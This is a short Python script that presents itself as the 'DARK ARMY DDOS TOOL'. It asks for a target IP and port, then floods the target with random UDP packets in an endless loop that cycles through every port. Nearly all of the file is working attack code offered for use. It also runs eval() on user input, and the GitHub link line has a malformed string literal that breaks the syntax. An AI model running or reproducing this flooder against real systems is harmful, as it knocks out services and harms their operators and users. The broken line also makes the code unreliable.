import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(9999)
#############

print("DARK ARMY DDOS TOOL")
print()
print("Author   : Aras Kral")
print("You Tube : https://www.youtube.com/channel/UChW9Jtfms-G_CLKZ3MB_XIA ")
print("github   : https://github.com/aras2727%22)
print("") 
print("")
ip = input("IP Target : ")
port = eval(input("Port       : "))

os.system("cls")
print("DARK ARMY DDOS TOOL")
print("[                    ] 0% ")
time.sleep(5)
print("[x----               ] 25%")
time.sleep(5)
print("[x---------          ] 50%")
time.sleep(5)
print("[x--------------     ] 75%")
time.sleep(5)
print("[x-------------------] 100%")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print("DARK ARMY DDOS Tool [%s File Sent To %s From %s Port] "%(sent,ip, port)) 

     if port == 65534:
       port = 1
